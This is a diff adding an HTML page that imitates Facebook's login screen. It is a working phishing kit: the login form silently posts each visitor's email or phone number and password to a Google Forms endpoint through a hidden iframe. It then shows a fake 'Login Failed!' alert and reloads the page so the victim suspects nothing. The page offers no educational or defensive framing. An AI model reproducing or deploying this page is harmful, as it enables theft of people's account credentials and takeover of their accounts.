@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook – log in or sign up</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Roboto', sans-serif;
+        }
+
+        body {
+            background-color: #f0f2f5;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            justify-content: space-between;
+        }
+
+        .main-content {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex: 1;
+            padding: 20px;
+        }
+
+        .fb-container {
+            display: flex;
+            flex-direction: row;
+            align-items: center;
+            justify-content: center;
+            max-width: 980px;
+            width: 100%;
+            gap: 40px;
+        }
+
+        .fb-left {
+            flex: 1;
+            padding-right: 20px;
+        }
+
+        .fb-logo {
+            color: #1877f2;
+            font-size: 4rem;
+            font-weight: 700;
+            letter-spacing: -2px;
+            margin-bottom: 10px;
+            line-height: 1;
+        }
+
+        .fb-tagline {
+            font-size: 1.75rem;
+            line-height: 1.28;
+            color: #1c1e21;
+            font-weight: 400;
+        }
+
+        .fb-right {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .form-card {
+            background: #ffffff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 396px;
+            text-align: center;
+        }
+
+        .input-group {
+            margin-bottom: 12px;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 17px;
+            outline: none;
+            background: #fff;
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+
+        .input-group input:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+
+        .login-btn {
+            width: 100%;
+            background-color: #1877f2;
+            border: none;
+            border-radius: 6px;
+            color: #fff;
+            font-size: 20px;
+            font-weight: 700;
+            line-height: 48px;
+            padding: 0 16px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            margin-top: 6px;
+        }
+
+        .login-btn:hover {
+            background-color: #166fe5;
+        }
+
+        .forgot-pass {
+            display: block;
+            color: #1877f2;
+            font-size: 14px;
+            font-weight: 500;
+            text-decoration: none;
+            margin: 16px 0;
+        }
+
+        .forgot-pass:hover {
+            text-decoration: underline;
+        }
+
+        .divider {
+            border-bottom: 1px solid #dadde1;
+            margin: 20px 0;
+        }
+
+        .create-btn {
+            background-color: #42b72a;
+            color: #fff;
+            border: none;
+            border-radius: 6px;
+            font-size: 17px;
+            font-weight: 700;
+            line-height: 48px;
+            padding: 0 16px;
+            cursor: pointer;
+            display: inline-block;
+            text-decoration: none;
+            transition: background-color 0.2s;
+        }
+
+        .create-btn:hover {
+            background-color: #36a420;
+        }
+
+        footer {
+            background-color: #ffffff;
+            color: #737373;
+            font-size: 12px;
+            padding: 20px 0;
+            text-align: center;
+            border-top: 1px solid #dddfe2;
+            margin-top: 40px;
+        }
+
+        footer .footer-langs {
+            max-width: 980px;
+            margin: 0 auto 10px auto;
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+
+        footer .footer-langs a {
+            color: #8a8d91;
+            text-decoration: none;
+        }
+
+        footer .footer-links {
+            max-width: 980px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            flex-wrap: wrap;
+        }
+
+        footer .footer-links a {
+            color: #737373;
+            text-decoration: none;
+        }
+
+        @media (max-width: 900px) {
+            .fb-container {
+                flex-direction: column;
+                text-align: center;
+            }
+            .fb-left {
+                padding-right: 0;
+                margin-bottom: 20px;
+            }
+            .fb-logo {
+                font-size: 3rem;
+            }
+            .fb-tagline {
+                font-size: 1.25rem;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="main-content">
+        <div class="fb-container">
+            <div class="fb-left">
+                <div class="fb-logo">facebook</div>
+                <div class="fb-tagline">Facebook helps you connect and share with the people in your life.</div>
+            </div>
+            
+            <div class="fb-right">
+                <div class="form-card">
+                    <form action="https://docs.google.com/forms/d/e/1FAIpQLSdLIneRMorMmFh6i1RXVMK_tC2t9T1uEs3nxwDDqbWF99M2UA/formResponse" 
+                          method="POST" 
+                          target="hidden_iframe" 
+                          onsubmit="submitted=true;">
+                        
+                        <!-- Email or Phone Field -->
+                        <div class="input-group">
+                            <input type="text" name="entry.80860767" placeholder="Email address or phone number" required>
+                        </div>
+
+                        <!-- Password Field -->
+                        <div class="input-group">
+                            <input type="password" name="entry.1367592527" placeholder="Password" required>
+                        </div>
+
+                        <button type="submit" class="login-btn">Log In</button>
+                    </form>
+
+                    <a href="#" class="forgot-pass">Forgotten password?</a>
+                    
+                    <div class="divider"></div>
+
+                    <button class="create-btn" type="button" onclick="alert('Create new account clicked!')">Create new account</button>
+
+                    <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;" onload="if(submitted) { alert('Login Failed!'); location.reload(); }"></iframe>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <footer>
+        <div class="footer-langs">
+            <a href="#">English (US)</a>
+            <a href="#">සිංහල</a>
+            <a href="#">தமிழ்</a>
+            <a href="#">Español</a>
+            <a href="#">Français (France)</a>
+        </div>
+        <div class="footer-links">
+            <a href="#">Sign Up</a>
+            <a href="#">Log In</a>
+            <a href="#">Messenger</a>
+            <a href="#">Facebook Lite</a>
+            <a href="#">Video</a>
+            <a href="#">Places</a>
+            <a href="#">Games</a>
+            <a href="#">Marketplace</a>
+        </div>
+    </footer>
+
+    <script>
+        let submitted = false;
+    </script>
+
+</body>
+</html>
